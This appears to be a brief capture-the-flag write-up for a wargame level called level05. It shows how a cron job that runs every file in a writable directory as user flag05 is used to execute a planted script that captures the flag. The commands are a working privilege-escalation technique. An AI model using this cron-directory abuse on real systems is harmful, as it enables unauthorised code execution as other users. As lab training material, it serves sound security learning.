### Solutions

When you connect to the shell you have a new mail

```console
~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This is a cronjob.
It launch a script called openareaserver with the user flag05 every 2 minutes

```
~$ cat /usr/sbin/openarenaserver
#!/bin/sh
for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

This script loop through all openarenaserver directory and execute each file
in this directory, -x launch the script in debug mode and redirect output to 
stderr

ulimit limit restrict the time utilization of the the script to 5 seconds

```console
~$ echo 'getflag > /opt/openarenaserver/out' > /opt/openarenaserver/test.sh
```

wait until the cron job execute the process

```console
~$ cat /opt/openarenaserver/out
```



